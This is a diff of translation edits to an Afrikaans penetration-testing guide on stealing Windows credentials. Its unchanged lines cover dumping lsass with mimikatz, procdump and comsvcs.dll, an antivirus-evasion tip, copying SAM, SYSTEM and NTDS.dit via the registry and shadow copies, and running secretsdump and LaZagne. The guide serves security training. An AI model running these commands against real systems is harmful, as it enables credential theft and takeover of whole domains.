@@ -65,15 +65,15 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-Dit proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Hierdie proses word outomaties gedoen met [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Let wel**: Sommige **AV** mag **ontdek** as **kwaadaardig** die gebruik van **procdump.exe om lsass.exe te dump**, dit is omdat hulle die string **"procdump.exe" en "lsass.exe"** **ontdek**. Dit is dus **stealthier** om die **PID** van lsass.exe as 'n **argument** aan procdump **oor te dra** **in plaas van** die **naam lsass.exe.**
+**Let wel**: Sommige **AV** mag die gebruik van **procdump.exe om lsass.exe te dump** as **kwaadaardig** beskou, dit is omdat hulle die string **"procdump.exe" en "lsass.exe"** **opspoor**. Dit is dus **stealthier** om die **PID** van lsass.exe as 'n **argument** aan procdump **te gee** in plaas van die **naam lsass.exe.**
 
 ### Dumping lsass met **comsvcs.dll**
 
 'n DLL genaamd **comsvcs.dll** wat in `C:\Windows\System32` gevind word, is verantwoordelik vir **dumping prosesgeheue** in die geval van 'n ongeluk. Hierdie DLL sluit 'n **funksie** genaamd **`MiniDumpW`** in, wat ontwerp is om aangeroep te word met `rundll32.exe`.\
-Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **volledig**. Geen alternatiewe opsies bestaan nie.\
-By die ontleding van hierdie drie komponente, word die DLL betrek om die dump-lêer te skep en die gespesifiseerde proses se geheue in hierdie lêer oor te dra.\
+Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een is in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêer ligging verteenwoordig die tweede, en die derde komponent is streng die woord **volledig**. Geen alternatiewe opsies bestaan.\
+Wanneer hierdie drie komponente ontleed word, word die DLL betrokke by die skep van die dump-lêer en die oordrag van die gespesifiseerde proses se geheue na hierdie lêer.\
 Die gebruik van **comsvcs.dll** is haalbaar vir die dumping van die lsass-proses, wat die behoefte om procdump op te laai en uit te voer, uitskakel. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Die volgende opdrag word gebruik vir uitvoering:
@@ -133,11 +133,11 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-Hierdie lêers moet **geleë wees** in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.
+Hierdie lêers moet **geleë** wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie net op 'n gewone manier kopieer nie** omdat hulle beskerm is.
 
 ### From Registry
 
-Die maklikste manier om daardie lêers te steel, is om 'n kopie van die registrasie te kry:
+Die maklikste manier om daardie lêers te steel, is om 'n kopie van die register te kry:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
@@ -154,7 +154,7 @@ Jy kan 'n kopie van beskermde lêers maak met behulp van hierdie diens. Jy moet 
 
 #### Gebruik vssadmin
 
-Die vssadmin-binary is slegs beskikbaar in Windows Server weergawes
+Die vssadmin binêre is slegs beskikbaar in Windows Server weergawes
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -188,9 +188,9 @@ Die **NTDS.dit** lêer is bekend as die hart van **Aktiewe Gids**, wat belangrik
 
 Binne hierdie databasis word drie primêre tabelle gehandhaaf:
 
-- **Data Tabel**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objektes soos gebruikers en groepe.
+- **Data Tabel**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objek soos gebruikers en groepe.
 - **Link Tabel**: Dit hou die verhouding, soos groep lidmaatskap, dop.
-- **SD Tabel**: **Sekuriteitsbeskrywings** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoor objektes verseker.
+- **SD Tabel**: **Sekuriteitsbeskrywings** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoor objek verseker.
 
 Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
@@ -198,13 +198,13 @@ Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer en dit word deur
 
 #### Ontsleuteling van die hashes binne NTDS.dit
 
-Die hash is 3 keer versleuteld:
+Die hash is 3 keer gekodeer:
 
-1. Ontsleutel Wagwoord Versleuteling Sleutel (**PEK**) met die **BOOTKEY** en **RC4**.
+1. Ontsleutel Wagwoord Enkripsie Sleutel (**PEK**) met die **BOOTKEY** en **RC4**.
 2. Ontsleutel die **hash** met **PEK** en **RC4**.
 3. Ontsleutel die **hash** met **DES**.
 
-**PEK** het die **selfde waarde** in **elke domeinbeheerder**, maar dit is **versleuteld** binne die **NTDS.dit** lêer met die **BOOTKEY** van die **SISTEEM lêer van die domeinbeheerder (is verskillend tussen domeinbeheerders)**. Dit is waarom jy die kredensiale van die NTDS.dit lêer moet kry **jy het die lêers NTDS.dit en SISTEEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** het die **selfde waarde** in **elke domeinbeheerder**, maar dit is **gecodeer** binne die **NTDS.dit** lêer met die **BOOTKEY** van die **SISTEEM lêer van die domeinbeheerder (is verskillend tussen domeinbeheerders)**. Dit is waarom jy die kredensiale van die NTDS.dit lêer moet kry **jy het die lêers NTDS.dit en SISTEEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Kopieer NTDS.dit met Ntdsutil
 
@@ -220,7 +220,7 @@ Sodra u die lêers **NTDS.dit** en **SYSTEM** verkry het, kan u gereedskap soos 
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Jy kan dit ook **automaties onttrek** met 'n geldige domein admin gebruiker:
+Jy kan dit ook **outomaties onttrek** met 'n geldige domein admin gebruiker:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
@@ -230,15 +230,15 @@ Laastens kan jy ook die **metasploit module** gebruik: _post/windows/gather/cred
 
 ### **Onttrekking van domeinobjekte uit NTDS.dit na 'n SQLite-databasis**
 
-NTDS-objekte kan na 'n SQLite-databasis onttrek word met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie net word geheime onttrek nie, maar ook die hele objekte en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
+NTDS-objekte kan na 'n SQLite-databasis onttrek word met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie net geheime word onttrek nie, maar ook die hele objekte en hul eienskappe vir verdere inligtingonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Die `SYSTEM` hive is opsioneel maar laat toe vir die ontsleuteling van geheime (NT & LM hashes, aanvullende akrediteerbare soos duidelike teks wagwoorde, kerberos of vertrou sleutel, NT & LM wagwoord geskiedenisse). Saam met ander inligting, die volgende data word onttrek: gebruiker en masjien rekeninge met hul hashes, UAC vlae, tydstempel vir laaste aanmelding en wagwoord verandering, rekening beskrywing, name, UPN, SPN, groepe en rekursiewe lede, organisatoriese eenhede boom en lidmaatskap, vertroude domeine met vertroue tipe, rigting en eienskappe...
+Die `SYSTEM` hive is opsioneel, maar laat toe vir die ontsleuteling van geheime (NT & LM hashes, aanvullende akrediteerbare soos duidelike teks wagwoorde, kerberos of vertrou sleutels, NT & LM wagwoord geskiedenisse). Saam met ander inligting, word die volgende data onttrek: gebruiker en masjien rekeninge met hul hashes, UAC vlae, tydstempel vir laaste aanmelding en wagwoord verandering, rekening beskrywing, name, UPN, SPN, groepe en rekursiewe lede, organisatoriese eenhede boom en lidmaatskap, vertroude domeine met vertroue tipe, rigting en eienskappe...
 
 ## Lazagne
 
-Laai die binêre af van [hier](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie binêre gebruik om akrediteerbare uit verskeie sagteware te onttrek.
+Laai die binêre van [hier](https://github.com/AlessandroZ/LaZagne/releases) af. Jy kan hierdie binêre gebruik om akrediteerbare uit verskeie sagteware te onttrek.
 ```
 lazagne.exe all
 ```
